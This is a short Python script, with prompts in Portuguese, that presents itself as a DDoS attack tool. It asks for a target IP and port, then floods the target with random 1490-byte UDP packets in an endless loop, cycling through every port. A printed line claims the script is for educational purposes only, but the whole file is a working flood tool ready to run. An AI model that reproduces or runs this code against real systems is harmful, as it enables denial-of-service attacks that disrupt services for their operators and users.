import socket
import time
import random
import os

conexao = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print("\nSCIPT DE ATAQUE DDOS\n")

ip = input("IP do alvo: ")
porta = int(input("Porta: "))
enviado = 0

os.system("clear")
print("ATAQUE COMEÇANDO...")
print("\nNOTA: USE APENAS PARA FINS EDUCACIONAIS \n")
time.sleep(3)
os.system("clear")


try:
    while True:
        try:
            conexao.sendto(bytes, (ip, porta))
            enviado += 1
            print(f"Enviado {enviado} pacote para {ip} pela porta: {porta}")
            porta += 1
            if porta > 65535:
                porta = 1

        except Exception as s:
            print(f"Erro ao se comunicar com alvo. {s}")

except Exception as e:
    print(f"Erro ao iniciar ataque. {e}")
